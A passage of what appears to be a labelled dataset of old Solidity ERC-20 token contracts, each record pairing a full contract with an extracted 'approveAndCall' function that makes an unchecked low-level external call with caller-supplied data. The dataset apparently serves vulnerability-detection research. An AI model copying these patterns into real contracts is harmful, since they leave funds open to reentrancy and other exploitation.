{ throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c3"
  },
  "filename": "35591.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract VRRCOIN is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function VRRCOIN(\n ) {\n balances[msg.sender] = 5000000000;\n totalSupply = 5000000000;\n name = \"VRRCOIN\";\n decimals = 2;\n symbol = \"VRRT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c4"
  },
  "filename": "35623.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CollegeFund is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function CollegeFund(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"CollegeFund\";\n decimals = 8;\n symbol = \"FUND\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c5"
  },
  "filename": "35624.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c6"
  },
  "filename": "35651.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract AfroCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function AfroCoin(\n ) {\n balances[msg.sender] = 200000000000000;\n totalSupply = 200000000000000;\n name = \"AfroCoin\";\n decimals = 7;\n symbol = \"AFRO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c7"
  },
  "filename": "35656.sol",
  "content": "pragma solidity ^0.4.17;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EthereumFutures is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'Ethereum Futures 1.0';\n function EthereumFutures(\n ) {\n balances[msg.sender] = 10000000000000;\n totalSupply = 10000000000000;\n name = \"Ethereum Futures\";\n decimals = 6;\n symbol = \"ETHF\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15c8"
  },
  "filename": "35657.sol",
  "content": "pragma solidity ^0.4.17;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EthereumFutures is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'Ethereum Futures 1.0';\n function EthereumFutures(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Ethereum Futures\";\n decimals = 6;\n symbol = \"ETHF\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15c9"
  },
  "filename": "35686.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EmediFind is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EmediFind(\n ) {\n balances[msg.sender] = 300000000000000;\n totalSupply = 3000000*10**8;\n name = \"EMF\";\n decimals = 8;\n symbol = \"EMF\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15ca"
  },
  "filename": "35708.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract eBitcoinCash is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function eBitcoinCash(\n ) {\n balances[msg.sender] = 2100000000000000;\n totalSupply = 2100000000000000;\n name = \"eBitcoinCash\";\n decimals = 8;\n symbol = \"eBCH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15cb"
  },
  "filename": "35717.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"Jeton\";\n decimals = 0;\n symbol = \"JTN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15cc"
  },
  "filename": "35718.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract JetonToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"Jeton\";\n decimals = 0;\n symbol = \"JTN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15cd"
  },
  "filename": "35719.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 90000000000000;\n totalSupply = 90000000000000;\n name = \"Dollarydoos\";\n decimals = 8;\n symbol = \"DDoos\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15ce"
  },
  "filename": "35721.sol",
